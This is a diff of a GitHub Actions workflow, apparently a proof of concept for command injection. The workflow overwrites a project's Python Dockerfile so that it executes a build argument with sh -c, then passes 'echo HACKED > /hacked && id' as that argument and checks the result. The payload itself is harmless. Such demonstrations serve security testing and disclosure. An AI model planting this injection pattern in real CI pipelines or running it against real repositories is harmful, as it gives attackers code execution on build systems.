@@ -1,28 +1,22 @@
-name: Working RCE Demo
+name: RCE Demo
 on: push
 
 jobs:
-  test:
+  hack:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v2
+      - uses: actions/checkout@v2
 
-      - name: Build with malicious PYTHON_VERSION
+      - name: Exploit
         run: |
-          # Create a custom Dockerfile
-          cat <<EOF > Dockerfile
-          ARG PYTHON_VERSION
-          FROM alpine
-          RUN sh -c "\$PYTHON_VERSION"
-          EOF
+          # Overwrite Mozilla's Dockerfile with ours
+          echo -e "ARG PYTHON_VERSION\nFROM alpine:latest\nRUN sh -c \"\$PYTHON_VERSION\"" > taskcluster/docker/python/Dockerfile
 
-          # Inject a malicious shell command via build arg
-          MALICIOUS_ARG="echo RCE_SUCCESS > /leak"
-
+          # Inject malicious command
           docker build \
-            --build-arg PYTHON_VERSION="$MALICIOUS_ARG" \
-            -t leak-check .
+            --build-arg PYTHON_VERSION="echo HACKED > /hacked && id" \
+            -t hacked \
+            ./taskcluster/docker/python
 
-          # Check if command executed
-          docker run --rm leak-check cat /leak || echo "No leak"
+          # Verify RCE
+          docker run --rm hacked cat /hacked
